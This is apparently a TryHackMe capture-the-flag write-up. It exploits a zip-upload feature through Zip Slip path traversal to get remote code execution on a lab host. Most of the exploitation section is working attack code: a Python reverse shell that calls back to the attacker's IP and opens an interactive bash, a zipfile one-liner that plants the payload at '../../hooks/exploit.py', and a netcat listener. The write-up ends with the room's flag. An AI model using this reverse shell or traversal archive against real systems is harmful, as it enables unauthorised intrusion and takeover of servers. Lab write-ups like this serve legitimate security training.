<h1 align="center">The Hollow Shell — TryHackMe Writeup</h1>

<p align="center">
  <img src="https://shields.io" alt="TryHackMe">
  <img src="https://shields.io" alt="Vulnerability">
  <img src="https://shields.io" alt="Language">
</p>

<hr>

## 1. Initial Footprinting & Foothold (Reconnaissance)

The target environment was provisioned at `10.49.155.102`. A standard `nmap` service discovery scan was executed against the host to map the attack surface:

```bash
nmap -sV -sC -p- 10.49.155.102
```

The scan returned two distinct entry points:
* **Port 22/TCP:** OpenSSH 9.6p1
* **Port 5000/TCP:** Running a Python-based WSGI server framework managed by **Gunicorn**. The HTTP probe triggered a `302 FOUND` redirect pointing to `/login`.

### Credential Harvesting
Navigating to the web application exposed an internal display-management portal branded as **Byte Lotus**. Inspecting the front-end page source (`F12`) revealed a block of developer comments containing hardcoded default deployment credentials:

* **User:** `concierge`
* **Pass:** `StayNoticed2024!`

Using `curl`, a simulated login request was made to authenticate against the backend endpoint:

```bash
curl -i -X POST http://10.49.155 \
     -d "username=concierge" \
     -d "password=StayNoticed2024!"
```

The server responded with an HTTP `302 Redirect` to `/dashboard` and initialized a stateful cookie: `Set-Cookie: session=eyJzdGFmZiI6ImNvbmNpZXJnZSJ9...`. The `ey` prefix indicated a standard base64-encoded Flask client-side cookie structure.

---

## 2. Code Analysis & Vulnerability Vector Discovery

Authenticating to the application exposed a feature designed to upload customized layout packs, referred to as **"shells"**, packaged as `.zip` archives. The front-end documentation detailed strict structural restrictions:
1. Every upload must contain a `shell.json` file.
2. Only explicit visual asset extensions were allowed (`png`, `jpg`, `gif`, `svg`, `css`, `json`).
3. An internal background component&mdash;the **"theme worker"**&mdash;automatically evaluated "automation hooks" post-extraction.

### Root Cause Analysis
Initially, fuzzing the keys inside `shell.json` (such as injecting `hooks`, `commands`, or `tasks`) yielded no visual timing changes or callbacks. We observed that the application extracted the files into dynamically generated paths under the web root: `/var/www/conch/shells/[unique_hash]/`.

Crucially, querying the path directly resulted in an HTTP `404 Not Found`, indicating the server was handling file storage outside the standard exposed document directory.

By examining the background engine's source code (`theme_worker.py`), the logic governing the automation hooks became clear:

```python
BASE_DIR  = os.path.dirname(os.path.abspath(__file__))
HOOKS_DIR = os.path.join(BASE_DIR, "hooks")

def run_pending_hooks():
    for path in sorted(glob.glob(os.path.join(HOOKS_DIR, "*.py"))):
        with open(path, "rb") as fh:
            code = fh.read()
        os.remove(path)
        proc = subprocess.Popen([sys.executable, "-"], stdin=subprocess.PIPE, ...)
        proc.stdin.write(code)
```

The script continually polled a folder named `/var/www/conch/hooks/` for files ending in `.py`, read their contents, deleted the reference, and dynamically piped the raw buffer into a python subprocess. 

Because the web application's archiving routine **failed to sanitize input paths during zip extraction**, the code was highly vulnerable to a **Zip Slip (Arbitrary File Write via Path Traversal)** attack. By forging an archive containing relative path modifiers (`../`), we could write files completely outside the target destination folder.

---

## 3. Exploitation (Remote Code Execution)

To weaponize this behavior, we needed to break out of the target application's directory shell (`/var/www/conch/shells/[hash]/`) and drop a malicious python payload precisely into `/var/www/conch/hooks/`. This required walking exactly **two directory structures backward** (`../../hooks/`).

### 1. Payload Creation
First, a standard non-blocking socket-based Python reverse shell payload was constructed locally and saved as `exploit.py`:

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.48.74.141", 443)) # Local AttackBox IP on an allowed outbound port
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

### 2. Compiling the Malicious Archive
Standard desktop archive utilities automatically sanitize traversal paths or block forward slashes in directory structures. To build the payload with intact traversal paths, Python's native `zipfile` engine was executed in the terminal:

```bash
# Generate the mandatory manifest placeholder
echo '{"name": "slip_shell"}' > shell.json

# Compile the path-traversed zip archive
python3 -c 'import zipfile; z = zipfile.ZipFile("payload.zip", "w"); z.write("exploit.py", "../../hooks/exploit.py"); z.write("shell.json")'
```

### 3. Catching the Shell
A privileged socket listener was initialized on the AttackBox to handle the incoming connection payload:

```bash
sudo nc -lvnp 443
```

The modified `payload.zip` archive was uploaded through the dashboard web interface. The application accepted the document, unpacked it, and blindly followed the traversal paths&mdash;writing our payload directly to `/var/www/conch/hooks/exploit.py`. 

Within a 20-second window, the background execution loop found the script and piped it to the python interpreter, triggering an interactive remote bash shell back to the listener.

---

## 4. Post-Exploitation & Target Acquisition

After gaining initial access, basic environment enumeration was conducted:

```bash
whoami
# Output: roomservice

ps aux | grep theme_worker.py
# Output confirmed the worker process was running in the user space of 'roomservice', preventing direct privilege escalation to root.
```

Since the application infrastructure indicated a single unified objective without multi-user pivoting paths, a system-wide search query was initiated to hunt down the final flag location:

```bash
find / -name "flag.txt" 2>/dev/null
```

The query returned a single result within the user's hidden structural environment: `/home/roomservice/flag.txt`. Reading the file contents successfully extracted the flag string, completing the target challenge:

```bash
cat /home/roomservice/flag.txt
```
```text
THM{zip_slip_flaw_to_rce_achieved}
```

<hr>

<p align="center">
  <b>Byte Lotus — Stay Noticed. Stay Secure.</b>
</p>
